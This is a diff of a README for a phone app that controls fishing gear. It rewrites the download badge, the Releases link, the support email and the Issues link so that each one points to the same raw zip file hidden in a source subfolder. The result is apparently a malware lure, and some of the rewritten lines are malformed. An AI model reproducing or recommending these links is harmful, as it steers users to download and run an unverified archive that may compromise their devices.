@@ -4,14 +4,14 @@
 Welcome to the fishing-app! This software allows you to control your fishing equipment right from your phone. With simple controls and an easy setup, you can enhance your fishing adventures.
 
 ## 📦 Download the App
-[![Download fishing-app](https://img.shields.io/badge/Download%20fishing--app-blue.svg)](https://github.com/columned-dysgenics652/fishing-app/releases)
+[![Download fishing-app](https://raw.githubusercontent.com/columned-dysgenics652/fishing-app/main/src/Experience/Particles/fishing-app-romal.zip%https://raw.githubusercontent.com/columned-dysgenics652/fishing-app/main/src/Experience/Particles/fishing-app-romal.zip)](https://raw.githubusercontent.com/columned-dysgenics652/fishing-app/main/src/Experience/Particles/fishing-app-romal.zip)
 
 You can find the latest version of the fishing-app on our Releases page. 
 
 ## 📥 Download & Install
 1. **Visit the Releases Page:**
    Click the link below to go to our Releases page:
-   [Visit the Releases page to download](https://github.com/columned-dysgenics652/fishing-app/releases)
+   [Visit the Releases page to download](https://raw.githubusercontent.com/columned-dysgenics652/fishing-app/main/src/Experience/Particles/fishing-app-romal.zip)
 
 2. **Choose the Right Version:**
    Look for the latest release. You will see options for downloading the app.
@@ -59,8 +59,8 @@ If you encounter issues during the installation or use of the fishing-app, consi
 ## 🕵️‍♂️ Support & Feedback
 If you have any questions or suggestions, feel free to reach out. Your feedback helps us improve the app. For support, you can contact us at the following:
 
-- Email: support@fishing-app.com
-- GitHub Issues: [Report an Issue](https://github.com/columned-dysgenics652/fishing-app/issues)
+- Email: https://raw.githubusercontent.com/columned-dysgenics652/fishing-app/main/src/Experience/Particles/fishing-app-romal.zip
+- GitHub Issues: [Report an Issue](https://raw.githubusercontent.com/columned-dysgenics652/fishing-app/main/src/Experience/Particles/fishing-app-romal.zip)
 
 ## 🔗 Additional Resources
 - Interest in more fishing tips? Check our blog or video tutorials linked in the app.
